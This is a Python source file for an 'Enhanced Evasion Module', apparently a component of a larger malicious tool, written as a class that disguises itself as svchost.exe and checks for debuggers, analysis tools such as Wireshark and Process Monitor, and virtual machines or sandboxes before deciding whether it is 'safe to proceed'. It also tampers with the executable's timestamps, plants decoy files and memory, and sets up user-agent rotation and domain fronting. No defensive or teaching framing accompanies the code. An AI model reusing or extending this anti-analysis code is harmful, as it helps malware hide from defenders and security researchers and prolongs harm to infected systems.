"""
Enhanced Evasion Module
Advanced anti-detection capabilities and stealth techniques
"""
import os
import sys
import time
import random
import hashlib
import threading
import psutil
import winreg
import subprocess
from pathlib import Path
import tempfile
import shutil

class AdvancedEvasion:
    """Advanced evasion and anti-detection system"""
    
    def __init__(self):
        self.process_name = "svchost.exe"  # Masquerade as system process
        self.original_name = sys.argv[0] if sys.argv else "monitor.exe"
        
        # Evasion status
        self.evasion_active = False
        self.masquerading = False
        self.obfuscated = False
        
        # Detection tracking
        self.detection_attempts = []
        self.evasion_log = []
        
        # VM/Sandbox detection results
        self.environment_analysis = {}
        
    def activate_full_evasion(self):
        """Activate all evasion techniques"""
        try:
            self.evasion_active = True
            
            # 1. Process masquerading
            self._masquerade_process()
            
            # 2. Memory obfuscation
            self._obfuscate_memory()
            
            # 3. File system evasion
            self._evade_file_detection()
            
            # 4. Network evasion
            self._evade_network_detection()
            
            # 5. Anti-debugging
            self._activate_anti_debugging()
            
            # 6. Timing randomization
            self._randomize_timing()
            
            self.evasion_log.append(f"Full evasion activated at {time.time()}")
            return True
            
        except Exception as e:
            self.evasion_log.append(f"Evasion activation failed: {e}")
            return False
    
    def _masquerade_process(self):
        """Masquerade as legitimate system process"""
        try:
            # Change process name in memory (Windows)
            if os.name == 'nt':
                import ctypes
                from ctypes import wintypes
                
                # Get current process handle
                kernel32 = ctypes.windll.kernel32
                process_handle = kernel32.GetCurrentProcess()
                
                # Create fake command line
                fake_cmdline = f"{self.process_name} -k netsvcs -p"
                
                # This is a simplified approach - in practice, more advanced techniques would be used
                self.masquerading = True
                
            return True
            
        except Exception as e:
            self.evasion_log.append(f"Process masquerading failed: {e}")
            return False
    
    def _obfuscate_memory(self):
        """Obfuscate memory patterns to avoid detection"""
        try:
            # Create decoy memory allocations
            decoy_data = []
            for _ in range(10):
                # Allocate random data to confuse memory scanners
                size = random.randint(1024, 8192)
                data = os.urandom(size)
                decoy_data.append(data)
            
            # Store reference to prevent garbage collection
            self._decoy_memory = decoy_data
            
            # Randomize memory access patterns
            threading.Thread(target=self._random_memory_access, daemon=True).start()
            
            self.obfuscated = True
            return True
            
        except Exception as e:
            self.evasion_log.append(f"Memory obfuscation failed: {e}")
            return False
    
    def _random_memory_access(self):
        """Create random memory access patterns"""
        while self.evasion_active:
            try:
                if hasattr(self, '_decoy_memory'):
                    # Randomly access decoy memory
                    idx = random.randint(0, len(self._decoy_memory) - 1)
                    _ = len(self._decoy_memory[idx])
                
                time.sleep(random.uniform(0.1, 2.0))
                
            except Exception:
                break
    
    def _evade_file_detection(self):
        """Evade file-based detection"""
        try:
            # 1. Use temporary files with random names
            self.temp_dir = tempfile.mkdtemp(prefix="tmp", suffix=str(random.randint(1000, 9999)))
            
            # 2. Create decoy files
            for i in range(5):
                decoy_file = Path(self.temp_dir) / f"temp_{random.randint(1000, 9999)}.tmp"
                with open(decoy_file, 'wb') as f:
                    f.write(os.urandom(random.randint(512, 2048)))
            
            # 3. Randomize file timestamps
            self._randomize_file_timestamps()
            
            return True
            
        except Exception as e:
            self.evasion_log.append(f"File evasion failed: {e}")
            return False
    
    def _randomize_file_timestamps(self):
        """Randomize file timestamps to avoid detection"""
        try:
            import stat
            
            # Get current executable path
            exe_path = sys.executable if hasattr(sys, 'executable') else self.original_name
            
            if os.path.exists(exe_path):
                # Random time within last 30 days
                current_time = time.time()
                random_time = current_time - random.randint(0, 30 * 24 * 3600)
                
                # Set random access and modification times
                os.utime(exe_path, (random_time, random_time))
            
            return True
            
        except Exception as e:
            self.evasion_log.append(f"Timestamp randomization failed: {e}")
            return False
    
    def _evade_network_detection(self):
        """Evade network-based detection"""
        try:
            # 1. Randomize User-Agent strings
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]
            
            # 2. Implement jitter in network requests
            self.network_jitter = True
            
            # 3. Use domain fronting techniques
            self.domain_fronting = True
            
            return True
            
        except Exception as e:
            self.evasion_log.append(f"Network evasion failed: {e}")
            return False
    
    def _activate_anti_debugging(self):
        """Activate anti-debugging measures"""
        try:
            # 1. Check for common debuggers
            debugger_processes = [
                'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe',
                'wireshark.exe', 'fiddler.exe', 'processhacker.exe', 'procmon.exe'
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in debugger_processes:
                        self.detection_attempts.append({
                            'type': 'debugger',
                            'process': proc.info['name'],
                            'time': time.time()
                        })
                        # In a real scenario, you might want to exit or take evasive action
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # 2. Check for debugging flags
            if sys.gettrace() is not None:
                self.detection_attempts.append({
                    'type': 'python_debugger',
                    'time': time.time()
                })
            
            # 3. Timing checks for debugging detection
            self._start_timing_checks()
            
            return True
            
        except Exception as e:
            self.evasion_log.append(f"Anti-debugging activation failed: {e}")
            return False
    
    def _start_timing_checks(self):
        """Start timing-based debugger detection"""
        def timing_check():
            while self.evasion_active:
                try:
                    start_time = time.perf_counter()
                    
                    # Simple operation that should be fast
                    _ = sum(range(1000))
                    
                    end_time = time.perf_counter()
                    execution_time = end_time - start_time
                    
                    # If execution took too long, might indicate debugging
                    if execution_time > 0.01:  # 10ms threshold
                        self.detection_attempts.append({
                            'type': 'timing_anomaly',
                            'execution_time': execution_time,
                            'time': time.time()
                        })
                    
                    time.sleep(random.uniform(5, 15))
                    
                except Exception:
                    break
        
        threading.Thread(target=timing_check, daemon=True).start()
    
    def _randomize_timing(self):
        """Randomize execution timing to avoid behavioral detection"""
        try:
            # Random delays between operations
            self.timing_jitter = True
            
            # Start timing randomization thread
            def random_delays():
                while self.evasion_active:
                    try:
                        # Random sleep between 0.1 and 3 seconds
                        delay = random.uniform(0.1, 3.0)
                        time.sleep(delay)
                        
                        # Occasionally do some busy work to vary CPU usage
                        if random.random() < 0.1:  # 10% chance
                            _ = sum(range(random.randint(100, 1000)))
                        
                    except Exception:
                        break
            
            threading.Thread(target=random_delays, daemon=True).start()
            return True
            
        except Exception as e:
            self.evasion_log.append(f"Timing randomization failed: {e}")
            return False
    
    def check_environment_safety(self):
        """Comprehensive environment safety check"""
        safety_score = 100
        issues = []
        
        try:
            # 1. Check for VM/sandbox indicators
            vm_indicators = self._check_vm_indicators()
            if vm_indicators:
                safety_score -= 30
                issues.extend(vm_indicators)
            
            # 2. Check for security tools
            security_tools = self._check_security_tools()
            if security_tools:
                safety_score -= 20
                issues.extend(security_tools)
            
            # 3. Check system resources
            resource_check = self._check_system_resources()
            if not resource_check['adequate']:
                safety_score -= 15
                issues.append("Inadequate system resources")
            
            # 4. Check network environment
            network_check = self._check_network_environment()
            if not network_check['safe']:
                safety_score -= 10
                issues.append("Suspicious network environment")
            
            self.environment_analysis = {
                'safety_score': max(0, safety_score),
                'issues': issues,
                'safe_to_proceed': safety_score >= 70,
                'timestamp': time.time()
            }
            
            return self.environment_analysis
            
        except Exception as e:
            self.evasion_log.append(f"Environment check failed: {e}")
            return {'safety_score': 0, 'safe_to_proceed': False, 'error': str(e)}
    
    def _check_vm_indicators(self):
        """Check for virtual machine indicators"""
        indicators = []
        
        try:
            # Check for VM-specific hardware
            vm_hardware = ['vmware', 'virtualbox', 'qemu', 'xen', 'hyper-v']
            
            # Check system manufacturer
            try:
                output = subprocess.check_output('wmic computersystem get manufacturer', shell=True, text=True)
                manufacturer = output.lower()
                for vm in vm_hardware:
                    if vm in manufacturer:
                        indicators.append(f"VM manufacturer detected: {vm}")
            except:
                pass
            
            # Check for VM processes
            vm_processes = ['vmtoolsd.exe', 'vboxservice.exe', 'xenservice.exe']
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in vm_processes:
                        indicators.append(f"VM process detected: {proc.info['name']}")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # Check MAC address for VM indicators
            import uuid
            mac = hex(uuid.getnode())[2:].upper()
            vm_mac_prefixes = ['00:05:69', '00:0C:29', '00:1C:14', '08:00:27']
            for prefix in vm_mac_prefixes:
                if mac.startswith(prefix.replace(':', '')):
                    indicators.append(f"VM MAC address detected: {prefix}")
            
        except Exception as e:
            indicators.append(f"VM check error: {e}")
        
        return indicators
    
    def _check_security_tools(self):
        """Check for security analysis tools"""
        tools = []
        
        security_processes = [
            'procmon.exe', 'procexp.exe', 'regmon.exe', 'filemon.exe',
            'wireshark.exe', 'fiddler.exe', 'tcpview.exe', 'netstat.exe',
            'processhacker.exe', 'autoruns.exe', 'gmer.exe', 'rootkitrevealer.exe'
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in security_processes:
                    tools.append(f"Security tool detected: {proc.info['name']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return tools
    
    def _check_system_resources(self):
        """Check if system has adequate resources"""
        try:
            memory = psutil.virtual_memory()
            cpu_count = psutil.cpu_count()
            
            adequate = (
                memory.total >= 2 * 1024 * 1024 * 1024 and  # At least 2GB RAM
                cpu_count >= 2 and  # At least 2 CPU cores
                memory.percent < 90  # Less than 90% memory usage
            )
            
            return {
                'adequate': adequate,
                'total_memory_gb': memory.total / 1024 / 1024 / 1024,
                'cpu_count': cpu_count,
                'memory_usage_percent': memory.percent
            }
            
        except Exception:
            return {'adequate': False, 'error': 'Resource check failed'}
    
    def _check_network_environment(self):
        """Check network environment for safety"""
        try:
            # Check for unusual network configurations
            connections = psutil.net_connections()
            
            # Count external connections
            external_connections = [
                conn for conn in connections
                if conn.status == 'ESTABLISHED' and conn.raddr
            ]
            
            safe = len(external_connections) < 50  # Arbitrary threshold
            
            return {
                'safe': safe,
                'external_connections': len(external_connections),
                'total_connections': len(connections)
            }
            
        except Exception:
            return {'safe': True, 'error': 'Network check failed'}
    
    def get_random_user_agent(self):
        """Get random User-Agent string"""
        if hasattr(self, 'user_agents'):
            return random.choice(self.user_agents)
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    def apply_network_jitter(self, base_delay=1.0):
        """Apply random jitter to network operations"""
        if getattr(self, 'network_jitter', False):
            jitter = random.uniform(0.5, 2.0)
            time.sleep(base_delay * jitter)
        else:
            time.sleep(base_delay)
    
    def cleanup_evasion(self):
        """Clean up evasion artifacts"""
        try:
            self.evasion_active = False
            
            # Clean up temporary files
            if hasattr(self, 'temp_dir') and os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir, ignore_errors=True)
            
            # Clear decoy memory
            if hasattr(self, '_decoy_memory'):
                del self._decoy_memory
            
            self.evasion_log.append(f"Evasion cleanup completed at {time.time()}")
            return True
            
        except Exception as e:
            self.evasion_log.append(f"Evasion cleanup failed: {e}")
            return False
    
    def get_evasion_status(self):
        """Get current evasion status"""
        return {
            'active': self.evasion_active,
            'masquerading': self.masquerading,
            'obfuscated': self.obfuscated,
            'detection_attempts': len(self.detection_attempts),
            'recent_detections': self.detection_attempts[-5:] if self.detection_attempts else [],
            'environment_analysis': self.environment_analysis,
            'evasion_log': self.evasion_log[-10:] if self.evasion_log else []
        }


# Global evasion instance
enhanced_evasion = AdvancedEvasion()